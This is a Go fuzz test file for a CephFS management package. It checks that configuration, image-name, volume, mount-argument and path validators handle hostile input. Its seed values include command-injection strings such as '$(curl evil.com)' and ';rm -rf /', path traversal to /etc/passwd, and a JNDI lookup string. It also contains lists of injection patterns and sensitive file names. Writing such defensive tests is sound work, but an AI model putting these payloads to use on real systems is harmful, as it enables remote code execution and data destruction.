package cephfs

import (
	"os"
	"strings"
	"testing"

	"github.com/CodeMonkeyCybersecurity/eos/pkg/testutil"
)

// FuzzValidateConfigurationSecurity tests configuration validation against injection attacks
func FuzzValidateConfigurationSecurity(f *testing.F) {
	// Seed with various configuration scenarios including security issues
	f.Add("", "", "", "test-cluster") // Empty required fields
	f.Add("admin.example.com", "10.0.0.0/24", "10.1.0.0/24", "my-cluster")
	f.Add("admin\x00null.com", "10.0.0.0/24", "10.1.0.0/24", "cluster")
	f.Add("admin.com", "10.0.0.0/0", "0.0.0.0/0", "test")
	f.Add("admin.evil.com", "192.168.1.0/24;rm -rf /", "10.0.0.0/24", "cluster")
	f.Add("$(curl evil.com)", "10.0.0.0/24", "10.1.0.0/24", "test")
	f.Add("admin.com", "10.0.0.0/24", "10.1.0.0/24", "cluster\nFAKE_LOG")
	f.Add("admin.com", "999.999.999.999/32", "invalid/cidr", "cluster")
	f.Add("admin.com", "10.0.0.0", "10.1.0.0", "cluster") // Missing CIDR
	f.Add("admin.com\ttab", "10.0.0.0/24\n", "10.1.0.0/24\r", "cluster")

	f.Fuzz(func(t *testing.T, adminHost, publicNetwork, clusterNetwork, clusterName string) {
		rc := testutil.TestRuntimeContext(t)

		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("validateConfiguration panicked with adminHost=%q: %v", adminHost, r)
			}
		}()

		config := &Config{
			AdminHost:      adminHost,
			PublicNetwork:  publicNetwork,
			ClusterNetwork: clusterNetwork,
			ClusterFSID:    clusterName,
			CephImage:      DefaultCephImage,
		}

		err := validateConfiguration(rc, config)

		// Check for command injection patterns
		injectionPatterns := []string{
			";", "&&", "||", "|", "`", "$(", "${",
			"rm -rf", "curl", "wget", "bash -c", "sh -c",
			"eval", "exec", "format", "del /",
		}

		for _, pattern := range injectionPatterns {
			if strings.Contains(adminHost+publicNetwork+clusterNetwork+clusterName, pattern) {
				t.Logf("Potentially dangerous injection pattern '%s' detected in config", pattern)
			}
		}

		// Check for null bytes, newlines, tabs
		controlChars := []string{"\x00", "\n", "\r", "\t"}
		for _, char := range controlChars {
			if strings.Contains(adminHost+publicNetwork+clusterNetwork+clusterName, char) {
				t.Logf("Control character detected in configuration: %q", char)
			}
		}

		// Empty required fields should error
		if adminHost == "" || publicNetwork == "" || clusterNetwork == "" {
			if err == nil {
				t.Errorf("Expected error for empty required fields")
			}
			return
		}

		// Invalid CIDR format should error
		if !strings.Contains(publicNetwork, "/") || !strings.Contains(clusterNetwork, "/") {
			if err == nil {
				t.Errorf("Expected error for invalid CIDR format")
			}
		}

		// Invalid image should error
		if config.CephImage != "" && !IsValidCephImage(config.CephImage) {
			if err == nil {
				t.Errorf("Expected error for invalid Ceph image")
			}
		}
	})
}

// FuzzCephImageValidationSecurity tests Ceph image validation against malicious inputs
func FuzzCephImageValidationSecurity(f *testing.F) {
	// Seed with various image scenarios including security issues
	f.Add("quay.io/ceph/ceph:v18.2.1")
	f.Add("docker.io/ceph/ceph:latest")
	f.Add("ceph/ceph:v17.2.0")
	f.Add("")
	f.Add("evil.com/malware:latest")
	f.Add("quay.io/ceph/ceph\x00:v18.2.1")
	f.Add("quay.io/ceph/ceph:v18.2.1;curl evil.com")
	f.Add("$(curl evil.com)/ceph:latest")
	f.Add("quay.io/ceph/ceph") // Missing tag
	f.Add("../../../etc/passwd:tag")
	f.Add("registry.evil.com/backdoor:latest")
	f.Add("quay.io/ceph/ceph:v18.2.1\nFAKE_IMAGE")
	f.Add("quay.io/ceph/ceph:${jndi:ldap://evil.com/}")

	f.Fuzz(func(t *testing.T, image string) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("IsValidCephImage panicked with image=%q: %v", image, r)
			}
		}()

		result := IsValidCephImage(image)

		// Check for dangerous patterns in image names
		dangerousPatterns := []string{
			"evil.com", "malware", "backdoor", "hack", "exploit",
			"../", "$(", "`", "${", ";", "&&", "||",
			"\x00", "\n", "\r", "\t",
		}

		for _, pattern := range dangerousPatterns {
			if strings.Contains(image, pattern) {
				t.Logf("Potentially dangerous pattern '%s' detected in image: %q", pattern, image)
				if result {
					t.Logf("WARNING: Dangerous image pattern was validated as valid")
				}
			}
		}

		// Empty images should be invalid
		if image == "" {
			if result {
				t.Errorf("Empty image should be invalid")
			}
			return
		}

		// Images without tags should be invalid
		if !strings.Contains(image, ":") {
			if result {
				t.Errorf("Image without tag should be invalid: %q", image)
			}
		}

		// Images not from valid registries should be invalid
		validRegistryPrefixes := []string{
			"quay.io/ceph/ceph:",
			"ceph/ceph:",
			"docker.io/ceph/ceph:",
		}

		hasValidPrefix := false
		for _, prefix := range validRegistryPrefixes {
			if strings.HasPrefix(image, prefix) {
				hasValidPrefix = true
				break
			}
		}

		if !hasValidPrefix && result {
			t.Logf("Image from non-standard registry validated as valid: %q", image)
		}
	})
}

// FuzzConfigStructValidation tests Config structure validation and security
func FuzzConfigStructValidation(f *testing.F) {
	// Seed with various configuration scenarios
	f.Add("cluster-1", "admin.local", "/dev/sda", "root", 3, 4096)
	f.Add("", "", "", "", 0, 0)
	f.Add("test\x00cluster", "admin\nhost", "/dev/sda;rm -rf /", "user", -1, -1)
	f.Add("cluster", "admin.com", "/dev/sda", "$(whoami)", 1000, 999999)
	f.Add("cluster", "admin.com", "../../../etc/passwd", "root", 3, 4096)
	f.Add("cluster\ttab", "admin\rhost", "/dev/sda\ninjection", "user", 3, 4096)
	f.Add("cluster", "admin.com", "/dev/sda", "user", 3, 4096)

	f.Fuzz(func(t *testing.T, clusterFSID, adminHost, osdDevice, sshUser string, monCount, osdMemory int) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Config structure test panicked: %v", r)
			}
		}()

		config := &Config{
			ClusterFSID:     clusterFSID,
			AdminHost:       adminHost,
			OSDDevices:      []string{osdDevice},
			SSHUser:         sshUser,
			MONCount:        monCount,
			OSDMemoryTarget: string(rune(osdMemory)) + "M",
			PublicNetwork:   "10.0.0.0/24",
			ClusterNetwork:  "10.1.0.0/24",
			CephImage:       DefaultCephImage,
		}

		// Test getter methods
		actualMONCount := config.GetMONCount()
		_ = config.GetMGRCount()
		actualObjectStore := config.GetObjectStore()
		_ = config.GetOSDMemoryTarget()

		// Validate bounds
		if monCount <= 0 && actualMONCount != DefaultMONCount {
			t.Errorf("Expected default MON count for invalid input, got %d", actualMONCount)
		}

		if monCount > 0 && monCount < 1000 && actualMONCount != monCount {
			t.Errorf("Expected MON count %d, got %d", monCount, actualMONCount)
		}

		// Check for injection patterns in device paths
		if strings.Contains(osdDevice, "..") ||
			strings.Contains(osdDevice, ";") ||
			strings.Contains(osdDevice, "|") {
			t.Logf("Potentially dangerous device path: %q", osdDevice)
		}

		// Check for command injection in SSH user
		if strings.ContainsAny(sshUser, ";&|`$()") {
			t.Logf("Potentially dangerous SSH user: %q", sshUser)
		}

		// Test control characters
		controlChars := []string{"\x00", "\n", "\r", "\t"}
		for _, char := range controlChars {
			if strings.Contains(clusterFSID+adminHost+osdDevice+sshUser, char) {
				t.Logf("Control character detected in config field")
			}
		}

		// Test structure integrity
		if config.ClusterFSID != clusterFSID {
			t.Errorf("ClusterFSID mismatch: got %q, want %q", config.ClusterFSID, clusterFSID)
		}

		if config.AdminHost != adminHost {
			t.Errorf("AdminHost mismatch: got %q, want %q", config.AdminHost, adminHost)
		}

		// Validate object store default
		if actualObjectStore != DefaultObjectStore {
			t.Errorf("Expected default object store, got %q", actualObjectStore)
		}
	})
}

// FuzzVolumeCreationSecurity tests volume creation functions for security issues
func FuzzVolumeCreationSecurity(f *testing.F) {
	// Seed with various volume scenarios
	f.Add("test-volume", "data-pool", "metadata-pool", "/mnt/test", 3)
	f.Add("", "", "", "", 0)
	f.Add("volume\x00null", "data;rm -rf /", "meta$(curl evil.com)", "/mnt/test", -1)
	f.Add("../../../etc/passwd", "data-pool", "metadata-pool", "/mnt/test", 1000)
	f.Add("volume", "data-pool", "metadata-pool", "../../../etc/passwd", 3)
	f.Add("volume\nFAKE_VOLUME", "data\ttab", "meta\rreturn", "/mnt/test", 3)
	f.Add("volume", "data-pool", "metadata-pool", "/mnt/test", 3)

	f.Fuzz(func(t *testing.T, volumeName, dataPool, metaPool, mountPoint string, replicationSize int) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Volume creation test panicked: %v", r)
			}
		}()

		config := &Config{
			Name:            volumeName,
			DataPool:        dataPool,
			MetadataPool:    metaPool,
			MountPoint:      mountPoint,
			ReplicationSize: replicationSize,
			PGNum:           DefaultPGNum,
		}

		// Test validateConfig function
		err := ValidateConfig(config)

		// Check for path traversal attempts
		if strings.Contains(volumeName+dataPool+metaPool+mountPoint, "../") {
			t.Logf("Path traversal attempt detected in volume config")
		}

		// Check for command injection patterns
		injectionPatterns := []string{
			";", "&&", "||", "|", "`", "$(", "${",
			"rm -rf", "curl", "wget", "bash", "sh",
		}

		for _, pattern := range injectionPatterns {
			if strings.Contains(volumeName+dataPool+metaPool+mountPoint, pattern) {
				t.Logf("Potential command injection pattern '%s' detected", pattern)
			}
		}

		// Check for control characters
		controlChars := []string{"\x00", "\n", "\r", "\t"}
		for _, char := range controlChars {
			if strings.Contains(volumeName+dataPool+metaPool+mountPoint, char) {
				t.Logf("Control character detected in volume config")
			}
		}

		// Empty volume name should error
		if volumeName == "" {
			if err == nil {
				t.Errorf("Expected error for empty volume name")
			}
			return
		}

		// Invalid replication size should error
		if replicationSize < 0 || replicationSize > 10 {
			if err == nil {
				t.Errorf("Expected error for invalid replication size: %d", replicationSize)
			}
		}

		// Validate config structure integrity
		if config.Name != volumeName {
			t.Errorf("Volume name mismatch: got %q, want %q", config.Name, volumeName)
		}
	})
}

// FuzzMountCommandGeneration tests mount command generation for injection vulnerabilities
func FuzzMountCommandGeneration(f *testing.F) {
	// Seed with various mount scenarios
	f.Add("admin", "/mnt/cephfs", "secretfile", "volume")
	f.Add("", "", "", "")
	f.Add("admin;rm -rf /", "/mnt/test", "/etc/secret", "volume")
	f.Add("admin", "/mnt/test\x00", "secret", "volume")
	f.Add("admin", "/mnt/test", "../../../etc/passwd", "volume")
	f.Add("$(whoami)", "/mnt/test", "secret", "volume\nFAKE")
	f.Add("admin", "/mnt/test", "secret", "volume")

	f.Fuzz(func(t *testing.T, user, mountPoint, secretFile, volumeName string) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Mount command generation panicked: %v", r)
			}
		}()

		config := &Config{
			User:         user,
			MountPoint:   mountPoint,
			SecretFile:   secretFile,
			Name:         volumeName,
			MonitorHosts: []string{"mon1:6789", "mon2:6789"},
			MountOptions: []string{"noatime", "_netdev"},
		}

		// Test buildMountArgs function
		args := BuildMountArgs(config)

		// Verify basic structure
		if len(args) < 3 {
			t.Errorf("Mount args too short: %v", args)
			return
		}

		// Should start with -t ceph
		if len(args) >= 2 && (args[0] != "-t" || args[1] != "ceph") {
			t.Errorf("Mount args should start with '-t ceph', got: %v", args[:2])
		}

		// Check for command injection in generated args
		fullCommand := strings.Join(args, " ")
		injectionPatterns := []string{
			";", "&&", "||", "`", "$(", "${",
			"rm -rf", "curl", "wget", "bash -c", "sh -c",
		}

		for _, pattern := range injectionPatterns {
			if strings.Contains(fullCommand, pattern) {
				t.Logf("Potential command injection in mount args: %q contains %q", fullCommand, pattern)
			}
		}

		// Check for path traversal
		if strings.Contains(fullCommand, "../") {
			t.Logf("Path traversal detected in mount args: %q", fullCommand)
		}

		// Check for control characters
		controlChars := []string{"\x00", "\n", "\r", "\t"}
		for _, char := range controlChars {
			if strings.Contains(fullCommand, char) {
				t.Logf("Control character detected in mount args")
			}
		}

		// Test shouldPersistMount function
		result := ShouldPersistMount(config)
		if len(config.MountOptions) > 0 {
			// Basic check that function doesn't panic
			_ = result
		}
	})
}

// FuzzHelperFunctionsSecurity tests helper functions for security issues
func FuzzHelperFunctionsSecurity(f *testing.F) {
	// Seed with various string scenarios
	f.Add("test", "test")
	f.Add("", "")
	f.Add("hello", "ell")
	f.Add("test\x00null", "null")
	f.Add("string", "str\ning")
	f.Add("$(curl evil.com)", "curl")
	f.Add("test;rm -rf /", ";rm")
	f.Add("normal string", "normal")

	f.Fuzz(func(t *testing.T, str, substr string) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Helper function panicked with str=%q substr=%q: %v", str, substr, r)
			}
		}()

		// Test contains function
		result1 := contains(str, substr)

		// Test indexOf function
		result2 := indexOf(str, substr)

		// Basic consistency check
		if substr != "" {
			if result1 && result2 == -1 {
				t.Errorf("contains() returned true but indexOf() returned -1 for str=%q substr=%q", str, substr)
			}
			if !result1 && result2 != -1 {
				t.Errorf("contains() returned false but indexOf() found index %d for str=%q substr=%q", result2, str, substr)
			}
		}

		// Check for dangerous patterns
		if strings.Contains(str+substr, "\x00") {
			t.Logf("Null byte detected in string operations")
		}

		// Verify indexOf bounds
		if result2 != -1 && (result2 < 0 || result2 > len(str)) {
			t.Errorf("indexOf returned out-of-bounds index %d for string length %d", result2, len(str))
		}

		// Empty substring should match (indexOf should return 0) except when string is empty
		if substr == "" && str != "" && result2 != 0 {
			t.Errorf("indexOf should return 0 for empty substring on non-empty string, got %d", result2)
		}
	})
}

// FuzzPathValidation tests path validation for security issues
func FuzzPathValidation(f *testing.F) {
	// Seed with various path scenarios including security issues
	f.Add("/mnt/cephfs")
	f.Add("")
	f.Add("/tmp/test")
	f.Add("../../../etc/passwd")
	f.Add("/mnt/test\x00")
	f.Add("/mnt/test;rm -rf /")
	f.Add("/mnt/test\n/fake/path")
	f.Add("$(curl evil.com)/path")
	f.Add("/mnt/test/../../../root")
	f.Add("/dev/null")

	f.Fuzz(func(t *testing.T, path string) {
		// Test should not panic regardless of input
		defer func() {
			if r := recover(); r != nil {
				t.Errorf("Path validation panicked with path=%q: %v", path, r)
			}
		}()

		// Test basic path operations that might be used
		if path != "" {
			// Test if path contains dangerous patterns
			dangerousPatterns := []string{
				"../", "..\\", "..", "/etc/", "/root/", "/home/",
				";", "&&", "||", "|", "`", "$(", "${",
				"\x00", "\n", "\r", "\t",
			}

			for _, pattern := range dangerousPatterns {
				if strings.Contains(path, pattern) {
					patternName := pattern
					switch pattern {
					case "\x00":
						patternName = "null byte"
					case "\n":
						patternName = "newline"
					case "\r":
						patternName = "carriage return"
					case "\t":
						patternName = "tab"
					}
					t.Logf("Potentially dangerous pattern '%s' detected in path: %q", patternName, path)
				}
			}

			// Test absolute vs relative paths
			if !strings.HasPrefix(path, "/") && path != "" {
				t.Logf("Relative path detected: %q", path)
			}

			// Test for suspicious extensions or files
			suspiciousNames := []string{
				"passwd", "shadow", "hosts", "fstab", "sudoers",
				"authorized_keys", "id_rsa", "config",
			}

			for _, name := range suspiciousNames {
				if strings.Contains(strings.ToLower(path), name) {
					t.Logf("Suspicious file/path name detected: %q contains %q", path, name)
				}
			}
		}
	})
}

// Helper function to create temporary files for testing
func createTempCephFile(content string) (string, error) {
	tmpFile, err := os.CreateTemp("", "ceph-fuzz-test-*")
	if err != nil {
		return "", err
	}

	_, err = tmpFile.WriteString(content)
	if err != nil {
		_ = tmpFile.Close() // Test cleanup, error not critical
		_ = os.Remove(tmpFile.Name())
		return "", err
	}

	_ = tmpFile.Close() // Test cleanup, error not critical
	return tmpFile.Name(), nil
}

func removeTempCephFile(path string) {
	_ = os.Remove(path)
}
